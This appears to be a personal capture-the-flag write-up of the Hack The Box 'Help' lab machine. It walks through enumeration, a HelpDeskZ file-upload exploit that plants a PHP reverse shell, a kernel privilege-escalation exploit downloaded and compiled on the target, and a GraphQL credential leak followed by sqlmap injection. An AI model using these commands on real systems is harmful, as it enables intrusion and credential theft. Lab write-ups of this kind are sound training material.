+++
date = '2026-06-01T23:49:11-04:00'
title = 'Help'
tags = ["htb", "easy", "sqli","kernel exploit","repeat"]
+++

``` IP
10.129.230.159
```
# OS: Ubuntu
# Credentials:

| Username | Password | Notes/Hash                  |
| -------- | -------- | --------------------------- |
| Shiv     |          | from `http://help.htb:3000` |


---
# Attack + Enum Vectors:
TCP 3000: HTTP; Node.js Express framework?
TCP 80: HTTP: Apache 2.4.18

TCP 22: SSH
## UDP (161 SNMP)?
UDP 161: closed

---
# `nmap` results:
```
# Nmap 7.99 scan initiated Mon Jun  1 16:10:36 2026 as: /usr/lib/nmap/nmap -p- --open -sC -sV -A -vv -oA nmap/Help 10.129.230.159
Nmap scan report for 10.129.230.159
Host is up, received echo-reply ttl 63 (0.018s latency).
Scanned at 2026-06-01 16:10:37 EDT for 28s
Not shown: 64490 closed tcp ports (reset), 1042 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZY4jlvWqpdi8bJPUnSkjWmz92KRwr2G6xCttorHM8Rq2eCEAe1ALqpgU44L3potYUZvaJuEIsBVUSPlsKv+ds8nS7Mva9e9ztlad/fzBlyBpkiYxty+peoIzn4lUNSadPLtYH6khzN2PwEJYtM/b6BLlAAY5mDsSF0Cz3wsPbnu87fNdd7WO0PKsqRtHpokjkJ22uYJoDSAM06D7uBuegMK/sWTVtrsDakb1Tb6H8+D0y6ZQoE7XyHSqD0OABV3ON39GzLBOnob4Gq8aegKBMa3hT/Xx9Iac6t5neiIABnG4UP03gm207oGIFHvlElGUR809Q9qCJ0nZsup4bNqa/
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHINVMyTivG0LmhaVZxiIESQuWxvN2jt87kYiuPY2jyaPBD4DEt8e/1kN/4GMWj1b3FE7e8nxCL4PF/lR9XjEis=
|   256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHxDPln3rCQj04xFAKyecXJaANrW3MBZJmbhtL4SuDYX
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18
|_http-title: Did not follow redirect to http://help.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
3000/tcp open  http    syn-ack ttl 63 Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

---
# Service Enum Notes:
### Web Service: `Gobuster` / `fuff`
Going in to `http://10.129.230.159` it redirected to `help.htb`. 
Let's update our `/etc/hosts` with `10.129.230.159` to `help.htb`

`http://help.htb/` showed default apache2 ubuntu page

Now let's view `http://help.htb:3000/`
Yield a message in `json` format:
```
{"message":"Hi Shiv, To get access please find the credentials with given query"}
```
Now we possible have a username `Shiv`, let's add that to our credential table 

Let's try spraying `Shiv:Shiv` first onto ssh: no luck.

Okay let's do some `gobuster`-ing then: first let's try on the non-default port 3000
```
gobuster dir -u http://help.htb:3000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -r -b 403,404
```
yields nothing interesting

```
gobuster dir -u http://help.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -r -b 403,404
```
which yields:
```
support              (Status: 200) [Size: 4413]
```
visiting `http://help.htb/support`
we see we are at `helpdeskz` software appearantly.

Now let's run gobuster on the `/support` directory
```
gobuster dir -u http://help.htb/support -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -r -b 403,404
```
got some results:
```
uploads              (Status: 200) [Size: 11321]
css                  (Status: 200) [Size: 0]
includes             (Status: 200) [Size: 11321]
js                   (Status: 200) [Size: 11321]
views                (Status: 200) [Size: 11321]
images               (Status: 200) [Size: 0]
controllers          (Status: 200) [Size: 11321]
```
viewing them, we got redirected to home page, let's move forward first

---
# Initial Foothold
Alright then let's play around with the `/support` page 
so searching `helpdeskz`: we found out that they have a github page
https://github.com/helpdesk-z/helpdeskz-dev
confirming with what we gobuster'd results showed above, it is likely the web application used.

Now they do have a `README.md` file; which contains the version number, going to
```
http://help.htb/support/README.md
```
it revealed that the `helpdeskz` version is 1.0.2! Look up for exploits on google
https://www.exploit-db.com/exploits/40300 We found this exploit that can upload an arbitrary file:
then we mirror the exploit
```
searchsploit -m 40300
```
and running:
```
python2 40300.py http://help.htb/support/ php-reverse-shell.php 
```
it returned:
```
Sorry, I did not find anything
```

I got a bit stuck here; then watched [ippsec](https://www.youtube.com/watch?v=XB8CbhfOczU) video on this box for some hints, turned out maybe the time of the target box was different than ours? Now I am not as skilled to modify the python script that much as of the moment, but I do want to continue with the box. (I will come back to trying to modify the exploit myself later)

I have decided to sync my time manually: after some research and using this site:
https://everytimezone.com/
I figured out that the time zone is UTC time. Turn off NTP:
```
timedatectl set-ntp 0
```
change our time zone to UTC:
```
sudo timedatectl set-timezone UTC
```

then running the exploit again:
```
sudo nc -lvnp 1337
```
```
python2 40300.py http://help.htb/support/ php-reverse-shell.php 
```
Interestingly also didn't show up anything. Assuming that we already fixed the time issue, then it could be our reverse shell issue? 

Re-reading the exploit we saw that we actually had to submit a ticket with our `.php` reverese shell as attachments. Then appearantly we can run it again? Running the exploit again nothing happened. Interesting... Then watching [ippsec](https://www.youtube.com/watch?v=XB8CbhfOczU) again; appearantly he was using `http://help.htb/support/uploads/tickets` which in interesting since the exploit specified to use `baseURL`. 

Doing some research and reading [0xdf](https://0xdf.gitlab.io/2019/06/08/htb-help.html#source-analysis) walkthrough in turned out the version `1.0.2` of helpdeskz stored any uploads to `/uploads/tickets`, which I wasn't able to find in https://github.com/helpdesk-z/helpdeskz-dev

Fortunately though, I found the old version of `1.0.2` old github with some digging on google: https://github.com/ViktorNova/HelpDeskZ and git cloning it and running:
```
grep -ri "uploads/"
```
it showed that
```
install/install.php:    $attach_dir = HELPDESKZ_PATH . 'uploads/tickets';
```
perfect! this is another thing we learn from this box.

alright, without further ado let's run the exploit again:
```
python2 40300.py http://help.htb/support/uploads/tickets php-reverse-shell.php 
```
this time we got in! Let's now upgrade our shell

---
# Priv Esc
After some enumeration: 
```
uname -a
```
we found that the linux version `4.4.0-116` is vulnerable to kernel exploits. 

I've actually encountered one before I believe it's vulnerable to: https://www.exploit-db.com/exploits/45010. But I decided to try the kernel exploit that `ippsec` did:
https://www.exploit-db.com/exploits/44298

I've tried the Virtual Hacking Labs trick by compiling the exploit with `-static`:
```
gcc -static 44298.c -o test
```
but running it did not work for some reason on the target...

After some struggling: I found that I can compile it on the target and running it works. So let's transfer the exploit to target. On target:
```
wget http://HTB_VPN_IP/44298.c
```
```
gcc 44298.c -o test
```
```
chmod +x test
```
```
./test
```
We got root! 

Therefore pwn'd.
# P.S.
Remember to change back the time zone of our kali, for my case:
```
timedatectl set-ntp 1
```
```
sudo timedatectl set-timezone America/New_York
```

---
# Conclusion & Remediation
This box was definitely not easy for me, but I had a lot of fun learning new methodologies that I get to add to my notes. For remediation, servers with `helpdeskz 1.0.2` should update it to the latest version. Also, developers should never allow for `.php` files upload with security by obscurity.

# Pushing For More:
Okay, seems like there is actually another way to get initial access on this box using `SQLi`; since this is the first box I do after my OSCP exam, I want to practice `sqlmap` as it was not allowed on the OSCP exam. First let's go back to the enumeration of `http://help.htb:3000`
```
{"message":"Hi Shiv, To get access please find the credentials with given query"}
```
Appearantly by walkthrough if we google'd `nodejs express query language` would have showed something hinting about `graphql`. However, I don't think this was very repeatable since I've tried googling `nodejs express pentesting` or something similar before, but yields nothing related to `graphql`. The most logical thing that make sense to me is `query` must be used with some `language`? Anyhow, I will add `google query language` to my methodology whenever I see the keyword `query`.

Now if we browsed it through the browser:
```
http://help.htb:3000/graphql
```
returned 
```
GET query missing.
```
which is non-default; in comparison to `http://help.htb:3000/help` yields
```
Cannot GET /help
```

Alright now how do we test this?
```
http://help.htb:3000/graphql?test
```
we got:
```
Must provide query string.
```
let's try:
```
http://help.htb:3000/graphql?test=username
```
still yield the same results
```
Must provide query string.
```

Maybe we have to literally use the `query` string?
```
http://help.htb:3000/graphql?query
```
we got
```
{"errors":[{"message":"Syntax Error GraphQL request (1:1) Unexpected <EOF>\n\n1: \n   ^\n","locations":[{"line":1,"column":1}]}]}
```
hmm I'm confused, let's try supplying it with something since it returned `<EOF>` probably because we supplied empty string?
```
http://help.htb:3000/graphql?query=test
```
yields
```
{"errors":[{"message":"Syntax Error GraphQL request (1:1) Unexpected Name \"user\"\n\n1: user\n   ^\n","locations":[{"line":1,"column":1}]}]}
```

Im a little confused, let's do some googling, since the error said something about GraphQL syntax error? Let's google: `graphql query syntax`; returned this resource https://graphql.org/learn/queries/
and with google AI overview i think we had to supply braces `{}` instead of `test`
```
http://help.htb:3000/graphql?query={test}
```
yields
```
{"errors":[{"message":"Cannot query field \"test\" on type \"Query\".","locations":[{"line":1,"column":2}]}]}
```
Okay so a different field? I think I am going the right way.

After struggling for a bit I went to [0xdf](https://0xdf.gitlab.io/2019/06/08/htb-help.html#source-analysis) walkthrough seeing that we had to supply `user`:
```
http://help.htb:3000/graphql?query={user}
```
yields
```
{"errors":[{"message":"Field \"user\" of type \"User\" must have a selection of subfields. Did you mean \"user { ... }\"?","locations":[{"line":1,"column":2}]}]}
```
Aha! Different results finally, now I think we have to supply one more braces `{}`
```
http://help.htb:3000/graphql?query={user{user}}
```
yields
```
{"errors":[{"message":"Cannot query field \"user\" on type \"User\". Did you mean \"username\"?","locations":[{"line":1,"column":7}]}]}
```

Alright seems like it's right! Let's query for username now:
```
http://help.htb:3000/graphql?query={user{username}}
```
yields
```
{"data":{"user":{"username":"helpme@helpme.com"}}}
```
Perfect! Now maybe we can get password?
```
http://help.htb:3000/graphql?query={user{password}}
```
yields
```
{"data":{"user":{"password":"5d3c93182bb20f07b994a7f617e99cff"}}}
```
Alright now let's try to break the password;

I don't know why leveraging `john` and `hashcat` I can't seem to crack it? And spraying it raw doesn't seem like correct password. Luckily using https://crackstation.net/ we got:
```
godhelpmeplz
```
Now we can finally log in to `http://help.htb/support/`, and leverage the other exploit:
https://www.exploit-db.com/exploits/41200

So after a while trying to figure this out, I had to reference to [0xdf](https://0xdf.gitlab.io/2019/06/08/htb-help.html#source-analysis) walkthrough since I am very weak with SQL injections: appearantly we have to upload an attachment and copy the URL of the attachment and leverage it with SQL injection. How it works is that **if the query is valid it will return the attachment as a result**

Now I learned something with `sqlmap`, we can intercept a request with `Burp Suite` and save it as a file. Then we can use `-r` flag of `sqlmap` to specify the exact request we want to test with. First I create a ticket and submit a `.jpg` file as attachment and copy the URL of the attachment. Then intercept the request and save it:
```
GET /support/?v=view_tickets&action=ticket&param[]=5&param[]=attachment&param[]=1&param[]=7 HTTP/1.1
Host: help.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: lang=english; PHPSESSID=u4ufu9aq6ens0gndmfodm77862; usrhash=0Nwx5jIdx%2BP2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ%2FiYFsjV6wVnLIF%2FaNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo%2BFnENl6bkapNbXODkHwpUpKDdvbjtucCrbgZXtDhnnXOQ%3D%3D
Upgrade-Insecure-Requests: 1
Priority: u=0, i


```
Then using sqlmap: specifying `param[]` as the vulnerable parameter here
```
sqlmap -r REQUEST_FILE --batch --level 5 --risk 3 -p param[]
```
We saw the database name is `support` and there are a few tables, let's enumerate the `staff` one since it's the more interesting looking one
```
sqlmap -r REQUEST_FILE --batch --level 5 --risk 3 -p param[] -D support -T staff --dump
```
we got the password hash cracked from `sqlmap` too:
```
Welcome1
```
and leveraging ssh, guessing `help` from the domain name `help.htb` as user:
```
ssh help@help.htb
```
we got in as `help`